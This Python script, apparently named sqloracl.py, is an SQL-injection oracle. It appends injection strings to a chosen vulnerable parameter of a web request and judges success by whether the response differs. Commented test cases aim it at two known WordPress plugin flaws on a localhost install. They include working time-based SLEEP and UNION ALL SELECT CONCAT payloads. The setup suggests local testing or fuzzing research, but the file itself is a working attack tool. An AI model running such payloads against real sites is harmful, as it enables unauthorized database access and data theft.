#coding:utf-8
import requests
import copy
import sys
import ast

## Model
def http_request(target, injtxt): 
    """send a post request to the target with a supplement to the vulnerable param and return server response"""
    injected_target = copy.deepcopy(target)
    injected_target.payload[target.vulnparam] = target.payload[target.vulnparam] + injtxt
    if target.method == "GET":
        r = requests.get(injected_target.url, params=injected_target.payload)
    elif target.method == "POST":
        r = requests.post(injected_target.url, data=injected_target.payload)    
    return r   


class HttpTarget:
    """describe a target with an url, method GET/POST, default payload and the vulnerable param."""
    def __init__(self, url, method, payload, vulnparam):
        self.url = url                                      # string
        self.method = method                                # GET or POST
        self.payload = payload                              # dict
        self.vulnparam = vulnparam                          # string
        self.defaultPage = http_request(self, '').text

       
## Oracle function    
def main():
    """return 0 only if injtxt is syntactically valid"""

    url, method, vulnparam, injtxt = sys.argv[1], sys.argv[2], sys.argv[4], sys.argv[5]
    payload = ast.literal_eval(sys.argv[3])
    
    target = HttpTarget(url, method, payload, vulnparam)
    r = http_request(target, injtxt)         
   
    if r.text.find("error")>= 0:    
        print("[oracleSQL] target raised error ┗( T﹏T )┛")
        return 1 # invalid
    elif r.text != target.defaultPage: # l'injection est sûre (facultatif)
        print("[oracleSQL] target sent a different response to the default one 🍾(ﾟヮﾟ☜)")
        return 0 # valid        
    else:
        print("[oracleSQL] not able to determine if \""+injtxt+"\" was undoubtedly invalid ¯\(°_o)/¯") 
        return 0 # default    
        
if __name__ == "__main__":
    main()        
    


    
 
## Tests
# Targets
#https://www.exploit-db.com/exploits/40971
#Command line : python sqloracl.py http://localhost/injections/wordp/wp-admin/admin-ajax.php POST {'action':'spAjaxResults','pollid':'2'} pollid [innjtxt]
simply_poll = HttpTarget("http://localhost/injections/wordp/wp-admin/admin-ajax.php",
                         "POST",
                         {'action':'spAjaxResults','pollid':'2'},
                         "pollid")


#https://wpvulndb.com/vulnerabilities/9251
#Command line : python sqloracl.py http://localhost/injections/wordp/wp-admin/wp-admin/admin.php GET {'action':'dt_duplicate_post_as_draft','post':''} post [innjtxt]
duplicate_page = HttpTarget("http://localhost/injections/wordp/wp-admin/wp-admin/admin.php",
                         "GET",
                         {'action':'dt_duplicate_post_as_draft','post':''},
                         "post")

## http_request 
#print(http_request(simply_poll, "").text)
## wrong post
#print(http_request(simply_poll, "toto").text)
## ## injection SQL (sleep 5s)
#print(http_request(simply_poll, ' AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)').text)
## ## injection SQL (CONCAT)
#print(http_request(simply_poll, ' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--').text)


## oracle
#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,""))
## wrong post
#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,"toto"))
## ## injection SQL (sleep 5s)
#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam," AND (SELECT 1158 FROM (SELECT(SLEEP(5)))eipW)"))
## ## injection SQL (CONCAT)
#print(oracle(simply_poll.url, simply_poll.method, simply_poll.payload, simply_poll.vulnparam,' UNION ALL SELECT 6050,6050,6050,6050,6050,CONCAT(0x71786a7171,0x574f546a6e7944764f597450476f724d73677867664f754967476f59636c5054705a4c7853736143,0x7170767871),6050--'))



